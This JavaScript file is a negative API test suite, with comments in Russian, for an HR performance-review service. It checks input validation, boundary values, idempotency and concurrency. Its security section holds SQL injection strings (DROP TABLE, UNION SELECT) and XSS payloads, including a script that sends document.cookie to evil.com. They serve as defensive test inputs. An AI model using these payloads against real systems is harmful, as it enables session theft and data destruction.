// tests/functional/api/performance-review.negative.api.spec.js
// Негативные API тесты для Performance Reviews
// Проверка валидации, граничных случаев, безопасности

import { test as base, expect } from "../../fixtures/full.js";
import { PerformanceReviewAPI, getCredentials } from "../../utils/api/index.js";
import { TestDataHelper } from "../../utils/TestDataHelper.js";
import {
  markAsAPITest,
  MODULES,
  setSeverity,
} from "../../utils/allure-helpers.js";
import { assertSuccessStatus } from "../../utils/api/common-assertions.js";

// API Base URL с fallback
const API_BASE_URL = process.env.API_BASE_URL;

/**
 * Минимальный payload для создания Performance Review
 */
function createMinimalPRPayload(title) {
  return {
    title,
    // ВАЖНО: все 4 направления обязательны, иначе SSR падает с 500
    directions: [
      {
        id: null,
        receiverType: "self",
        isSelected: true,
        title: null,
        description: null,
      },
      {
        id: null,
        receiverType: "head",
        isSelected: true,
        title: null,
        description: null,
      },
      {
        id: null,
        receiverType: "subordinate",
        isSelected: false,
        title: null,
        description: null,
      },
      {
        id: null,
        receiverType: "colleague",
        isSelected: false,
        title: null,
        description: null,
      },
    ],
    anonymityType: "notAnonymous",
    workflowType: "basic",
    notificationsSchedule: {
      enableReminds: false,
      baseDate: new Date().toISOString(),
      repeatType: "noRepeat",
      timezoneOffset: 0,
    },
    isApprovalStep: false,
    isAsyncSteps: false,
    isAsyncStepsSelfResponseStep: false,
  };
}

// Расширяем test с фикстурой для Performance Review API
const test = base.extend({
  prAPI: async ({ request }, use) => {
    const api = new PerformanceReviewAPI(request);
    const { email, password } = getCredentials("admin");
    await api.signIn(email, password);
    await use(api);
  },
});

test.describe(
  "Performance Review Negative Tests",
  { tag: ["@api", "@regression", "@performance-review", "@negative"] },
  () => {
    test.beforeEach(() => {
      markAsAPITest(MODULES.PERFORMANCE_REVIEW, "Negative Tests");
    });

    let createdReviewId = null;

    test.afterEach(async ({ prAPI }) => {
      if (createdReviewId) {
        try {
          await prAPI.archive(createdReviewId);
          await prAPI.remove(createdReviewId);
        } catch (e) {
          // ignore
        }
        createdReviewId = null;
      }
    });

    test.describe("Валидация входных данных", () => {
      test("C6143: POST - создание с невалидным anonymityType", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с невалидным anonymityType", async () => {
          const payload = {
            ...createMinimalPRPayload("Invalid AnonymityType Test"),
            anonymityType: "invalidType",
          };

          const { response } = await prAPI.create(payload);

          // API должен отклонить невалидное значение enum
          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6144: POST - создание с невалидным workflowType", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с невалидным workflowType", async () => {
          const payload = {
            ...createMinimalPRPayload("Invalid WorkflowType Test"),
            workflowType: "superWorkflow",
          };

          const { response } = await prAPI.create(payload);

          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6145: POST - создание с невалидной датой в notificationsSchedule", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с невалидной датой в notificationsSchedule", async () => {
          const payload = {
            ...createMinimalPRPayload("Invalid Date Test"),
            notificationsSchedule: {
              enableReminds: false,
              baseDate: "not-a-date",
              repeatType: "noRepeat",
              timezoneOffset: 0,
            },
          };

          const { response } = await prAPI.create(payload);

          // API должен отклонить невалидную дату
          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6146: POST - создание с отрицательным timezoneOffset", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        let response, data;
        await test.step("Выполнить запрос: POST - создание с отрицательным timezoneOffset", async () => {
          const payload = {
            ...createMinimalPRPayload("Negative Timezone Test"),
            notificationsSchedule: {
              enableReminds: false,
              baseDate: new Date().toISOString(),
              repeatType: "noRepeat",
              timezoneOffset: -99999,
            },
          };

          ({ response, data } = await prAPI.create(payload));

          // Отрицательный offset может быть валидным (часовые пояса)
          // Но экстремальные значения должны отклоняться
          if (response.ok()) {
            createdReviewId = data.id;
            console.log("API accepts extreme negative timezoneOffset");
          }
          // Тест проходит в любом случае - документируем поведение API
          // API должен либо принять значение (200/201) либо отклонить (400/422)
        });

        await test.step("Проверить ответ", async () => {
          expect([200, 201, 400, 422]).toContain(response.status());
        });
      });

      test("C6147: POST - создание с directions не массивом", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с directions не массивом", async () => {
          const payload = {
            ...createMinimalPRPayload("Invalid Directions Test"),
            directions: "not-an-array",
          };

          const { response } = await prAPI.create(payload);

          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6148: POST - создание с isApprovalStep не boolean", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с isApprovalStep не boolean", async () => {
          const payload = {
            ...createMinimalPRPayload("Invalid Boolean Test"),
            isApprovalStep: "yes",
          };

          const { response, data } = await prAPI.create(payload);

          // API может привести строку к boolean или отклонить
          if (response.ok()) {
            createdReviewId = data.id;
            console.log("API coerces string to boolean for isApprovalStep");
          }
          // API должен либо принять значение (с приведением типа) либо отклонить
          expect([200, 201, 400, 422]).toContain(response.status());
        });
      });
    });

    test.describe("Граничные значения", () => {
      test("C6149: POST - создание с очень длинным title (10000 символов)", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с очень длинным title (10000 символов)", async () => {
          const longTitle = "A".repeat(10000);
          const payload = createMinimalPRPayload(longTitle);

          const { response, data } = await prAPI.create(payload);

          // API может принять или отклонить слишком длинный title
          if (response.ok()) {
            createdReviewId = data.id;
            console.log(
              `API accepts title with ${longTitle.length} characters`,
            );
            // Проверяем что title сохранился
            const { data: fetched } = await prAPI.getById(data.id);
            expect(fetched.title.length).toBeGreaterThan(0);
          } else {
            expect([400, 413, 422]).toContain(response.status());
          }
        });
      });

      test("C6150: POST - создание с очень длинным description (50000 символов)", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с очень длинным description (50000 символов)", async () => {
          const longDescription = "Description ".repeat(5000);
          const payload = {
            ...createMinimalPRPayload("Long Description Test"),
            description: longDescription,
          };

          const { response, data } = await prAPI.create(payload);

          if (response.ok()) {
            createdReviewId = data.id;
            console.log(
              `API accepts description with ${longDescription.length} characters`,
            );
          } else {
            expect([400, 413, 422]).toContain(response.status());
          }
        });
      });

      test("C6151: POST - создание с пустым объектом notificationsSchedule", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с пустым объектом notificationsSchedule", async () => {
          const payload = {
            ...createMinimalPRPayload("Empty Schedule Test"),
            notificationsSchedule: {},
          };

          const { response } = await prAPI.create(payload);

          // API должен требовать обязательные поля в schedule
          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6152: POST - создание с null значениями", async ({ prAPI }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - создание с null значениями", async () => {
          const payload = {
            title: null,
            directions: null,
            anonymityType: null,
            workflowType: null,
            notificationsSchedule: null,
            isApprovalStep: null,
            isAsyncSteps: null,
          };

          const { response } = await prAPI.create(payload);

          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6153: GET - запрос с ID = 0", async ({ prAPI }) => {
        setSeverity("normal");

        await test.step("Выполнить: GET - запрос с ID = 0", async () => {
          const { response } = await prAPI.getById(0);

          expect(response.ok()).toBe(false);
          expect([400, 404]).toContain(response.status());
        });
      });

      test("C6154: GET - запрос с отрицательным ID", async ({ prAPI }) => {
        setSeverity("normal");

        await test.step("Выполнить: GET - запрос с отрицательным ID", async () => {
          const { response } = await prAPI.getById(-1);

          expect(response.ok()).toBe(false);
          expect([400, 404]).toContain(response.status());
        });
      });

      test("C6155: GET - запрос с очень большим ID", async ({ prAPI }) => {
        setSeverity("normal");

        await test.step("Выполнить: GET - запрос с очень большим ID", async () => {
          const { response } = await prAPI.getById(Number.MAX_SAFE_INTEGER);

          expect(response.ok()).toBe(false);
          expect([400, 404]).toContain(response.status());
        });
      });

      test("C6156: GET - запрос с float ID", async ({ prAPI }) => {
        setSeverity("normal");

        await test.step("Выполнить: GET - запрос с float ID", async () => {
          const { response } = await prAPI.getById(123.456);

          expect(response.ok()).toBe(false);
          // API может округлить или отклонить
          expect([400, 404]).toContain(response.status());
        });
      });
    });

    test.describe("SQL Injection попытки", () => {
      test(
        "C6157: POST - title с SQL injection",
        { tag: ["@critical", "@db"] },
        async ({ prAPI, prVerifier }) => {
          setSeverity("critical");
          const sqlInjectionPayloads = [
            "'; DROP TABLE performance_reviews; --",
            "1' OR '1'='1",
            "1; SELECT * FROM users",
            "' UNION SELECT * FROM accounts --",
          ];

          for (const maliciousTitle of sqlInjectionPayloads) {
            const payload = createMinimalPRPayload(maliciousTitle);
            const { response, data } = await prAPI.create(payload);

            if (response.ok()) {
              // Если создалось - проверяем что title сохранился как текст, а не выполнился как SQL
              const { data: fetched } = await prAPI.getById(data.id);
              expect(fetched.title).toBe(maliciousTitle);

              await test.step(`DB: Проверка что SQL injection сохранён как текст`, async () => {
                if (!prVerifier.isConnected()) return;
                await prVerifier.verifyPRCreated(data.id);
              });

              // Cleanup
              await prAPI.archive(data.id);
              await prAPI.remove(data.id);
            }
            // API должен либо принять как текст, либо отклонить
            expect([200, 201, 400, 422]).toContain(response.status());
          }
        },
      );

      test(
        "C6158: GET - ID с SQL injection",
        { tag: ["@critical"] },
        async ({ prAPI }) => {
          setSeverity("critical");

          await test.step("Выполнить: GET - ID с SQL injection", async () => {
            const maliciousIds = [
              "1 OR 1=1",
              "1; DROP TABLE--",
              "1' AND '1'='1",
            ];

            for (const maliciousId of maliciousIds) {
              const { response } = await prAPI.getById(maliciousId);

              // API должен отклонить невалидный ID
              expect(response.ok()).toBe(false);
              expect([400, 404]).toContain(response.status());
            }
          });
        },
      );
    });

    test.describe("XSS попытки", () => {
      test(
        "C6159: POST - title с XSS payload",
        { tag: ["@critical"] },
        async ({ prAPI }) => {
          setSeverity("critical");

          await test.step("Выполнить: POST - title с XSS payload", async () => {
            const xssPayloads = [
              '<script>alert("XSS")</script>',
              '<img src="x" onerror="alert(1)">',
              '"><script>alert(document.cookie)</script>',
              "javascript:alert('XSS')",
              '<svg onload="alert(1)">',
            ];

            for (const xssTitle of xssPayloads) {
              const payload = createMinimalPRPayload(xssTitle);
              const { response, data } = await prAPI.create(payload);

              if (response.ok()) {
                // Если создалось - проверяем что XSS экранирован или сохранён как текст
                const { data: fetched } = await prAPI.getById(data.id);
                // Title должен быть сохранён (может быть экранирован)
                expect(fetched.title).toBeDefined();
                console.log(`XSS payload stored as: ${fetched.title}`);

                // Cleanup
                await prAPI.archive(data.id);
                await prAPI.remove(data.id);
              }
              // API должен либо принять (и экранировать), либо отклонить
              expect([200, 201, 400, 422]).toContain(response.status());
            }
          });
        },
      );

      test(
        "C6160: POST - description с XSS payload",
        { tag: ["@critical"] },
        async ({ prAPI }) => {
          setSeverity("critical");

          await test.step("Выполнить: POST - description с XSS payload", async () => {
            const payload = {
              ...createMinimalPRPayload("XSS Description Test"),
              description:
                '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
            };

            const { response, data } = await prAPI.create(payload);

            if (response.ok()) {
              createdReviewId = data.id;
              const { data: fetched } = await prAPI.getById(data.id);
              console.log(
                `XSS in description stored as: ${fetched.description?.substring(0, 100)}`,
              );
            }
            expect([200, 201, 400, 422]).toContain(response.status());
          });
        },
      );
    });

    test.describe("Проверка идемпотентности", () => {
      test(
        "C6161: DELETE - повторное удаление уже удалённого PR",
        { tag: ["@db"] },
        async ({ prAPI, prVerifier }) => {
          setSeverity("normal");
          // Создаём
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("Идемпотентное удаление"),
            ),
          );

          await test.step("DB: Проверка что PR создан", async () => {
            if (!prVerifier.isConnected()) return;
            await prVerifier.verifyPRCreated(created.id);
          });

          // Архивируем и удаляем
          await prAPI.archive(created.id);
          const { response: firstDelete } = await prAPI.remove(created.id);
          expect(firstDelete.ok()).toBe(true);

          await test.step("DB: Проверка что PR удалён (soft delete)", async () => {
            if (!prVerifier.isConnected()) return;
            await prVerifier.verifyPRDeleted(created.id);
          });

          // Повторное удаление
          const { response: secondDelete } = await prAPI.remove(created.id);

          // Должен вернуть ошибку (уже удалён)
          expect(secondDelete.ok()).toBe(false);
          expect([404, 409, 410]).toContain(secondDelete.status());
        },
      );

      test(
        "C6162: POST archive - повторное архивирование",
        { tag: ["@db"] },
        async ({ prAPI, prVerifier }) => {
          setSeverity("normal");
          // Создаём
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("Двойная архивация"),
            ),
          );
          createdReviewId = created.id;

          // Первое архивирование
          const { response: firstArchive } = await prAPI.archive(created.id);
          expect(firstArchive.ok()).toBe(true);

          await test.step("DB: Проверка что PR архивирован", async () => {
            if (!prVerifier.isConnected()) return;
            await prVerifier.verifyPRArchived(created.id);
          });

          // Повторное архивирование
          const { response: secondArchive } = await prAPI.archive(created.id);

          // API может вернуть ok (идемпотентность) или ошибку
          console.log(`Second archive status: ${secondArchive.status()}`);
          expect([200, 201, 400, 409]).toContain(secondArchive.status());
        },
      );

      test("C6163: POST restore - восстановление не архивированного PR", async ({
        prAPI,
      }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST restore - восстановление не архивированного PR", async () => {
          // Создаём (не архивируем)
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("Восстановление неархивного"),
            ),
          );
          createdReviewId = created.id;

          // Пытаемся восстановить не архивированный
          const { response: restoreResponse } = await prAPI.restore(created.id);

          // API может вернуть ok (идемпотентность) или ошибку
          console.log(
            `Restore non-archived status: ${restoreResponse.status()}`,
          );
          expect([200, 400, 409]).toContain(restoreResponse.status());
        });
      });
    });

    test.describe("Проверка конкурентного доступа", () => {
      test("C6164: Параллельные обновления одного PR", async ({ prAPI }) => {
        setSeverity("normal");

        let final;
        await test.step("Выполнить запрос: Параллельные обновления одного PR", async () => {
          // Создаём
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("Конкурентное обновление"),
            ),
          );
          createdReviewId = created.id;

          // Запускаем 5 параллельных обновлений
          const updatePromises = [];
          for (let i = 0; i < 5; i++) {
            updatePromises.push(
              prAPI.update(created.id, { title: `Concurrent Update ${i}` }),
            );
          }

          const results = await Promise.all(updatePromises);

          // Все запросы должны завершиться (успешно или с конфликтом)
          for (const { response } of results) {
            expect([200, 409, 423]).toContain(response.status());
          }

          // Проверяем финальное состояние
          ({ data: final } = await prAPI.getById(created.id));
        });

        await test.step("Проверить ответ", async () => {
          expect(final.title).toMatch(/Concurrent Update \d/);
        });
      });
    });

    test.describe("Проверка JSON parsing", () => {
      test("C6165: POST - malformed JSON в body (через raw request)", async ({
        request,
      }) => {
        setSeverity("normal");

        let response;
        await test.step("Выполнить запрос: POST - malformed JSON в body (через raw request)", async () => {
          const api = new PerformanceReviewAPI(request);
          const { email, password } = getCredentials("admin");
          await api.signIn(email, password);

          // Отправляем невалидный JSON напрямую
          response = await request.post(
            `${API_BASE_URL}/manager/performance-reviews`,
            {
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${api.token}`,
              },
              data: '{"title": "test", invalid json}',
            },
          );

          // API должен вернуть ошибку парсинга
        });

        await test.step("Проверить ответ", async () => {
          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6166: POST - пустое тело запроса", async ({ request }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - пустое тело запроса", async () => {
          const api = new PerformanceReviewAPI(request);
          const { email, password } = getCredentials("admin");
          await api.signIn(email, password);

          const response = await request.post(
            `${API_BASE_URL}/manager/performance-reviews`,
            {
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${api.token}`,
              },
              data: "",
            },
          );

          expect([400, 422]).toContain(response.status());
        });
      });

      test("C6167: POST - Content-Type text/plain", async ({ request }) => {
        setSeverity("normal");

        await test.step("Выполнить: POST - Content-Type text/plain", async () => {
          const api = new PerformanceReviewAPI(request);
          const { email, password } = getCredentials("admin");
          await api.signIn(email, password);

          const response = await request.post(
            `${API_BASE_URL}/manager/performance-reviews`,
            {
              headers: {
                "Content-Type": "text/plain",
                Authorization: `Bearer ${api.token}`,
              },
              data: JSON.stringify(createMinimalPRPayload("Text Plain Test")),
            },
          );

          // API может требовать application/json
          expect([200, 201, 400, 415]).toContain(response.status());
        });
      });
    });

    test.describe("Проверка HTTP методов", () => {
      test("C6168: PUT вместо POST для обновления", async ({
        prAPI,
        request,
      }) => {
        setSeverity("normal");

        let response;
        await test.step("Выполнить запрос: PUT вместо POST для обновления", async () => {
          // Создаём
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("HTTP метод"),
            ),
          );
          createdReviewId = created.id;

          // Пробуем PUT вместо POST
          response = await request.put(
            `${API_BASE_URL}/manager/performance-reviews/${created.id}`,
            {
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${prAPI.token}`,
              },
              data: JSON.stringify({ title: "PUT Update" }),
            },
          );

          // API может не поддерживать PUT
          console.log(`PUT method status: ${response.status()}`);
        });

        await test.step("Проверить ответ", async () => {
          expect([200, 404, 405]).toContain(response.status());
        });
      });

      test("C6169: PATCH для частичного обновления", async ({
        prAPI,
        request,
      }) => {
        setSeverity("normal");

        let response;
        await test.step("Выполнить запрос: PATCH для частичного обновления", async () => {
          // Создаём
          const { data: created } = await prAPI.create(
            createMinimalPRPayload(
              TestDataHelper.generateUniqueName("PATCH метод"),
            ),
          );
          createdReviewId = created.id;

          // Пробуем PATCH
          response = await request.patch(
            `${API_BASE_URL}/manager/performance-reviews/${created.id}`,
            {
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${prAPI.token}`,
              },
              data: JSON.stringify({ title: "PATCH Update" }),
            },
          );

          console.log(`PATCH method status: ${response.status()}`);
        });

        await test.step("Проверить ответ", async () => {
          expect([200, 404, 405]).toContain(response.status());
        });
      });
    });
  },
);
